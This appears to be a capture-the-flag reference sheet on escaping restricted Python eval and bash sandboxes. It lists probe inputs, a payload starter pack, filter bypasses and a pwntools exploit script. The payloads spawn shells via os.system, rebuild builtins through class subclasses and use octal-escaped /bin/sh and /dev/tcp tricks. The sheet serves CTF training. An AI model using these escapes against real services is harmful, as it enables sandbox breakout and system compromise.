# Misc Jail Escape

## When to suspect this

- Remote prompt evaluates expressions or commands with restrictions.
- Errors mention blocked names, AST nodes, unknown functions, forbidden characters.
- Shell is `rbash`, limited command set, no spaces/slashes/letters.
- Python `eval`, sandbox, calculator, template, or REPL challenge.
- You need to read `/flag` but normal commands are blocked.

## Fast triage checklist

- Map allowed characters.
- Map allowed syntax/nodes/functions.
- Identify evaluation context: Python eval/exec, bash eval, double quotes, command argv.
- Test string/number construction.
- Test file read primitive.
- Test import/command primitive.
- For remote oracle, script send/receive after manual mapping.

## Manual confirmation

Python probes:

```python
1+1
'a'
().__class__
[].__class__.__mro__
__import__('os').system('id')
open('/flag').read()
```

Bash probes:

```bash
$#
$$
$0
\
'
$'\057\142\151\156\057\163\150'
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| pwntools | Remote REPL scripting | `remote(HOST, PORT)` | Stable query loop |
| [ctf-misc/pyjails.md](../ctf-misc/pyjails.md) | Python jail techniques | Open reference | Escape family |
| [ctf-misc/bashjails.md](../ctf-misc/bashjails.md) | Bash restrictions | Open reference | Eval context/bypass |
| Python local harness | Test payload syntax | `python3 -q` | Valid payload |

## Payload starter pack

Python:

```python
().__class__.__mro__[1].__subclasses__()
exec(compile('__import__("os").system("sh")','','exec'))
open(''.join(['fl','ag'])).read()
'\x66\x6c\x61\x67'
```

Bash:

```bash
$0
$'\057\142\151\156\057\163\150'
HISTFILE=/flag /bin/bash
bash -v /flag
cat < /dev/tcp/127.0.0.1/PORT
```

## Exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = "HOST", 1337
r = remote(HOST, PORT)

def q(payload):
    r.recvuntil(b"> ")
    r.sendline(payload.encode())
    out = r.recvuntil(b"\n", timeout=2)
    print(payload, "=>", out)
    return out

for p in ["1+1", "'a'", "().__class__", "open('/flag').read()"]:
    q(p)

r.interactive()
```

## Escalation path

- If file read works, read flag directly.
- If import works, run minimal command.
- If only oracle functions exist, binary search the secret.
- If chars restricted, build strings from escapes, existing names, env vars, object attributes.
- If bash escaped, enumerate `/proc`, SUID, capabilities, internal services.

## Common bypasses

- Unicode/fullwidth identifiers.
- Hex/octal/raw Unicode escapes.
- Decorators when calls/quotes blocked.
- `getattr` alternatives: `vars`, `format`, descriptors.
- Python class hierarchy to recover builtins.
- Bash `$#`, `$$`, `$0`, `${##}`, ANSI-C quoting.
- `/dev/tcp` when netcat missing.

## Rabbit holes

- Trying known payloads before mapping filters.
- Ignoring error messages that reveal filter type.
- Assuming shell after escape means flag file is readable.
- Forgetting post-shell internal services.
- Overcomplicating when oracle extraction is intended.

## Final solve checklist

- Allowed syntax/chars are mapped.
- Escape or oracle primitive is proven.
- Payload is minimal and repeatable.
- Flag read path is documented.

